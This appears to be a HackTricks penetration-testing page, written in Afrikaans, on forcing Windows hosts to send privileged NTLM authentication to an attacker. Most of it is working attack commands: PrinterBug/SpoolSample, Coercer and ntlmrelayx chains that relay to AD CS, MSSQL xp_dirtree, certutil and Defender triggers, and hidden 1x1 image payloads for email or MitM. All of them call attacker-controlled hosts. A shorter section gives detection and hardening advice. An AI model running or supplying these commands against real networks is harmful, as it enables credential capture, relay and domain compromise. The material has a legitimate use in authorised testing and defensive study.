# Dwing bevoorregte NTLM-verifikasie af

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) is ’n **versameling** **snellers vir afgeleë verifikasie**, in C# geskryf met die MIDL-samelaar om afhanklikhede van derde partye te vermy.

## Misbruik van Spooler-diens

As die _**Print Spooler**_-diens **geaktiveer is,** kan jy reeds bekende AD-bewyse gebruik om die domeinbeheerder se drukbediener te **versoek** om ’n **opdatering** oor nuwe druktake, en hom bloot sê om die kennisgewing **na ’n stelsel te stuur**.\
Let daarop dat wanneer die drukker die kennisgewing na arbitrêre stelsels stuur, dit teen daardie **stelsel moet verifieer**. ’n Aanvaller kan dus die _**Print Spooler**_-diens dwing om teen ’n arbitrêre stelsel te verifieer, en die diens sal die **rekenaarrekening** in hierdie verifikasie gebruik.

Onder die enjinkap misbruik die klassieke **PrinterBug**-primitief **`RpcRemoteFindFirstPrinterChangeNotificationEx`** oor **`\\PIPE\\spoolss`**. Die aanvaller maak eers ’n handvatsel na ’n drukker/bediener oop en verskaf dan ’n vals kliëntnaam in `pszLocalMachine`, sodat die teikenspooler ’n kennisgewingkanaal **terug na die aanvaller-beheerde gasheer** skep. Daarom is die uitwerking **afdwinging van uitgaande verifikasie**, eerder as direkte kode-uitvoering.<sup>[[2]](#references)</sup>\
As jy op soek is na **RCE/LPE** in die spooler self, kyk na [PrintNightmare](printnightmare.md). Hierdie bladsy fokus op **afdwinging en relay**.

### Vind Windows-bedieners in die domein

Gebruik PowerShell om Windows-gashere te lys. Bedieners is gewoonlik die teikens met die hoogste prioriteit, so fokus eers daarop:

```bash
Get-ADComputer -Filter {(OperatingSystem -like "*Windows Server*") -and (Enabled -eq $true)} -Properties DNSHostName |
  Select-Object -ExpandProperty DNSHostName > servers.txt
```

### Vind Spooler-dienste wat luister

Gebruik 'n effens aangepaste weergawe van @mysmartlogin (Vincent Le Toux) se [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) om te kyk of die Spooler Service luister:

```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```

Jy kan ook `rpcdump.py` op Linux gebruik en na die **MS-RPRN**-protokol soek:

```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```

Of toets vinnig gashere vanaf Linux met **NetExec/CrackMapExec**:

```bash
nxc smb targets.txt -u user -p password -M spooler
```

As jy **coercion-oppervlakke wil enumerate** in plaas daarvan om net te kontroleer of die spooler-eindpunt bestaan, gebruik **Coercer scan mode**:<sup>[[5]](#references)</sup>

```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```

Dit is nuttig omdat die endpoint in EPM sien jou net vertel dat die print RPC-koppelvlak geregistreer is. Dit **waarborg nie** dat elke coercion-metode met jou huidige regte bereikbaar is, of dat die gasheer ’n bruikbare authentication-vloei sal uitstuur nie.

### Vra die diens om teen ’n arbitrêre gasheer te autentiseer

Jy kan [SpoolSample vanaf die oorspronklike repository saamstel](https://github.com/leechristensen/SpoolSample).

```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```

of gebruik [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) of [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) as jy op Linux is

```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```

Met **Coercer** kan jy die spooler-koppelvlakke direk teiken en vermy om te raai watter RPC-metode blootgestel word:<sup>[[5]](#references)</sup>

```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```

### Moderne RPC-oor-TCP-terugroepe

Moenie aanvaar dat ’n suksesvolle `RpcRemoteFindFirstPrinterChangeNotificationEx`-oproep verkeer op TCP/445 moet veroorsaak nie. **Windows 11 22H2 en later gebruik RPC oor TCP by verstek vir drukkommunikasie**; RPC oor benoemde pype is gedeaktiveer, tensy ’n beleid dit herstel of `RpcUseNamedPipeProtocol=1` gestel word. Daarom kan verouderde SMB-alleen-luisterdienste rapporteer dat die sneller gestuur is, maar nooit die terugroep ontvang nie. Microsoft dokumenteer TCP/135 (Endpoint Mapper) plus dinamiese RPC-poorte vir normale druk-RPC, en organisasies kan hierdie reeks beperk of ’n vaste druk-RPC-poort kies.<sup>[[10]](#references)</sup>

Huidige **Impacket `ntlmrelayx.py`** sluit ’n RPC-relaybediener en ’n klein Endpoint Mapper in, wat by verstek op TCP/135 geaktiveer is. Hierdie ondersteuning is in Junie 2025 saamgevoeg, spesifiek met ’n gedemonstreerde PrinterBug-na-AD-CS-ketting, wat toelaat dat die geënkripteerde RPC-terugroep gerelay word, selfs wanneer die slagoffer nie na SMB/WebDAV terugval nie.<sup>[[11]](#references)</sup>

RPC-relay-/EPM-ondersteuning is beskikbaar in **Impacket 0.13.0 en later**. Voordat jy ’n ontbrekende TCP/135-luisterdiens ondersoek, verifieer dat ’n ouer verpakte `ntlmrelayx.py` nie uitgevoer word nie; die hulpuitvoer behoort albei RPC-bedienerskakelaars te wys.<sup>[[12]](#references)</sup>

```bash
python3 -m pip show impacket | grep '^Version:'
ntlmrelayx.py -h | grep -E -- '--rpc-port|--no-rpc-server'
```

```bash
# Recent Impacket: the RPC/EPM listener starts automatically on TCP/135
# Use --template DomainController instead when coercing a DC
sudo ntlmrelayx.py -t 'http://ca.corp.local/certsrv/certfnsh.asp' \
  --adcs --template Machine -smb2support

# Trigger after the listener is ready; use a name/address reachable by the victim
printerbug.py 'corp.local/user:password'@TARGET ATTACKER_FQDN
```

Soek na `Setting up RPC Server on port 135` en `RPCD: Received connection` in die relay-uitvoer. As die RPC-aanroep ’n verwagte fout teruggee, maar niks die listener bereik nie, gaan die slagoffer se print RPC-transportbeleid, uitgaande filtering, DNS-resolusie na, en kyk of ’n ander proses reeds TCP/135 gebruik. Maak ook seker dat `ntlmrelayx` nie met `--no-rpc-server` begin is nie.

### Forcing HTTP instead of SMB with WebClient

Op stelsels wat steeds **RPC over named pipes** gebruik (legacy builds of gedrag wat deur beleid herstel is), lewer die klassieke PrinterBug gewoonlik ’n **SMB**-verifikasie aan `\\attacker\share`, wat steeds nuttig is vir **capture**, **relay to HTTP targets** of **relay where SMB signing is absent**.\
Omdat relay van **SMB to SMB** dikwels deur **SMB signing** geblokkeer word, verkies operators dalk om eerder **HTTP/WebDAV**-verifikasie af te dwing. Dit is nie ’n terugvalopsie vir die RPC-over-TCP-gedrag hierbo beskryf nie.

As die teiken die **WebClient**-diens laat loop, kan die listener in ’n vorm gespesifiseer word wat Windows **WebDAV over HTTP** laat gebruik:

```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```

Dit is veral nuttig wanneer dit saam met **`ntlmrelayx --adcs`** of ander HTTP-relayteikens gebruik word, omdat dit voorkom dat daar op SMB relayability oor die gedwonge verbinding staatgemaak word. Die belangrike voorbehoud is dat **WebClient op die slagoffer moet loop** vir die HTTP/WebDAV-variant om te werk.

### Combining with Unconstrained Delegation

As 'n aanvaller 'n rekenaar gekompromitteer het wat vir [Unconstrained Delegation](unconstrained-delegation.md) opgestel is, kan hulle **die drukker dwing om by daardie rekenaar te autentiseer**. Die drukkerrekenaarrekening se **TGT** word dan in die geheue op die Unconstrained Delegation-gasheer gekas, waar die aanvaller dit met [Pass the Ticket](pass-the-ticket.md) kan ophaal en hergebruik.

### Opsporing- en verhardingsnotas

Die betroubaarste manier om PrinterBug van 'n DC, PAW of bediener wat nie druk nie, te verwyder, is om die Spooler te stop en te deaktiveer. Waar drukwerk nodig is, verhard elke moontlike relaybestemming (SMB-bedienerondertekening, LDAP-ondertekening/kanaalbinding en EPA op HTTP-dienste soos AD CS) eerder as om aan te neem dat dit voldoende is om TCP/445 op die terugbelpad te blokkeer.<sup>[[1]](#references)</sup>

```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```

As die gasheer steeds **plaaslike drukwerk** benodig, is ’n meer beperkte beheer die GPO `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`. Dit voorkom dat die spooler afgeleë kliëntverbindings (en drukkerdeling) aanvaar, terwyl die diens plaaslik beskikbaar bly; herbegin die spooler nadat jy dit toegepas het, en herhaal dan die MS-RPRN-bereikbaarheidskontroles hierbo.<sup>[[13]](#references)</sup>

Opsporing behoort ’n geverifieerde oproep na MS-RPRN UUID `12345678-1234-abcd-ef00-0123456789ab`, veral opnum 62/65 met ’n nie-plaaslike terugbelwaarde, en ’n onmiddellike uitgaande SMB-, HTTP- of RPC-verbinding vanaf die spooler-gasheer met mekaar te korreleer. Stel basislyne vir **koppelvlak-UUID/opnum en bron-/bestemmingspare**, nie net toegang tot `\PIPE\spoolss` nie, want huidige drukstapels kan die terugbelverbinding oor RPC-over-TCP laat loop.<sup>[[1]](#references)[[10]](#references)[[11]](#references)</sup>

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### RPC UNC-pad-dwingingsmatriks (koppelvlakke/opnums wat uitgaande verifikasie aktiveer)
- MS-RPRN (Print System Remote Protocol)
  - Pipe: \\PIPE\\spoolss
  - IF UUID: 12345678-1234-abcd-ef00-0123456789ab
  - Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
  - Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
  - Pipe: \\PIPE\\spoolss
  - IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
  - Notes: asynchrone druk-koppelvlak op dieselfde spooler-pipe; gebruik Coercer om bereikbare metodes op ’n gegewe gasheer op te som<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
  - Pipes: \\PIPE\\efsrpc (ook via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
  - IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
  - Opnums wat dikwels misbruik word: 0, 4, 5, 6, 7, 12, 13, 15, 16
  - Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
  - Pipe: \\PIPE\\netdfs
  - IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
  - Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
  - Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
  - Pipe: \\PIPE\\FssagentRpc
  - IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
  - Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
  - Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
  - Pipe: \\PIPE\\even
  - IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
  - Opnum: 9 ElfrOpenBELW
  - Tool: CheeseOunce<sup>[[1]](#references)</sup>

Nota: Hierdie metodes aanvaar parameters wat ’n UNC-pad kan bevat (bv. `\\attacker\share`). Wanneer Windows dit verwerk, sal dit by daardie UNC verifieer (in die masjien-/gebruiker-konteks), wat NetNTLM-opname of -relay moontlik maak.\
Vir spooler-misbruik bly **MS-RPRN opnum 65** die mees algemene en goed gedokumenteerde primitief, omdat die protokolspesifikasie uitdruklik meld dat die bediener ’n kennisgewingskanaal terug skep na die kliënt wat deur `pszLocalMachine` gespesifiseer word.<sup>[[2]](#references)</sup>

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN oor \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Effect: die teiken probeer die verskafte rugsteunlogpad oopmaak en verifieer by die aanvaller-beheerde UNC.<sup>[[1]](#references)</sup>
- Practical use: dwing Tier 0-bates (DC/RODC/Citrix/etc.) om NetNTLM uit te stuur, en relay dit dan na AD CS-eindpunte (ESC8/ESC11-scenario’s) of ander bevoorregte dienste.<sup>[[1]](#references)</sup>

## PrivExchange

Die `PrivExchange`-aanval is die gevolg van ’n fout in die **Exchange Server `PushSubscription`-funksie**. Hierdie funksie laat toe dat enige domeingebruiker met ’n posbus die Exchange-bediener dwing om oor HTTP by enige gasheer wat deur die kliënt verskaf word, te verifieer.

By verstek loop die **Exchange-diens as SYSTEM** en het dit buitensporige voorregte (spesifiek **WriteDacl-voorregte op die domein voor die 2019 Cumulative Update**). Hierdie fout kan uitgebuit word om **inligting na LDAP te relay en daarna die domein se NTDS-databasis te onttrek**. Waar relay na LDAP nie moontlik is nie, kan hierdie fout steeds gebruik word om na ander gashere binne die domein te relay en daar te verifieer. Suksesvolle uitbuiting van hierdie aanval verleen onmiddellike toegang tot Domain Admin met enige geverifieerde domeingebruikerrekening.

## Binne Windows

As jy reeds binne die Windows-masjien is, kan jy Windows dwing om met bevoorregte rekeninge aan ’n bediener te koppel met:

### Defender MpCmdRun

```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```

### MSSQL

```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```

[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)

```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```

Of gebruik hierdie ander tegniek: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Dit is moontlik om die certutil.exe lolbin (Microsoft-ondertekende binêre lêer) te gebruik om NTLM-verifikasie af te dwing:

```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```

## HTML injection

### Via e-pos

As jy die **email address** ken van die gebruiker wat by ’n masjien aanmeld wat jy wil compromise, kan jy hom eenvoudig ’n **email met ’n 1x1 image** stuur, soos:

```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

Wanneer die slagoffer dit oopmaak, probeer Windows verifieer.

### MitM

As jy ’n MitM-aanval kan uitvoer en HTML in ’n bladsy kan invoeg wat die slagoffer bekyk, probeer om ’n prent soos die volgende in te voeg:

```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

## Ander maniere om NTLM-verifikasie af te dwing en te phish


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## NTLMv1 crack

As jy NTLMv1-challenges kan vasvang, lees hier hoe om hulle te crack](../ntlm/index.html#ntlmv1-attack).\
_Onthou dat jy Responder se challenge op "1122334455667788" moet stel om NTLMv1 te crack._



## References

- [1] [Unit 42 – Verifikasiedwang bly ontwikkel](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: EventLog-afstandprotokol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – Windows-metodes vir afgedwonge verifikasie](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
- [10] [Microsoft – RPC-verbindingsopdaterings vir drukwerk in Windows 11](https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print)
- [11] [Fortra Impacket – RPC-relaybediener en Endpoint Mapper vir ntlmrelayx](https://github.com/fortra/impacket/pull/1974)
- [12] [Fortra Impacket 0.13.0-vrystelling](https://github.com/fortra/impacket/releases/tag/impacket_0_13_0)
- [13] [Microsoft – Policy CSP: Laat Print Spooler toe om kliëntverbindings te aanvaar](https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-admx-printing2)
{{#include ../../banners/hacktricks-training.md}}
